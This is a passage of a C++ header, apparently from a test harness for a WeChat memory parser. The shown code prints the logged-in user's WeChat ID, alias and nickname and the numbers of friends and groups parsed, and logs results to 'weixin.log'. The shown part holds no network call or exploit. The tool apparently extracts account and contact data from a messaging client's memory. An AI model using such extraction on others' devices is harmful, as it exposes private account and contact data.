        printf("[+] Self Account: WxID=%s | Alias=%s | Nickname=%s\n", self.wxid.c_str(), self.alias.c_str(), self.nickname.c_str());
        printf("[+] Total Friends Parsed: %zu\n", friends.size());
        printf("[+] Total Groups Parsed: %zu\n\n", chatrooms.size());
        return true;
    }
    else
    {
        printf("[-] Failed to open log file for writing: %s\n", logFile);
        return false;
    }
}

// 交互式控制台菜单
static inline void RunWeChatParserInteractive()
{
    printf("========================================================\n");
    printf("         WeChat Memory Parser Test Suite (Interactive)  \n");
    printf("========================================================\n");
    RunWeChatParserTestAuto("weixin.log");
}

} // namespace WeChatParser

#endif // ENABLE_WECHAT_PARSER_TEST
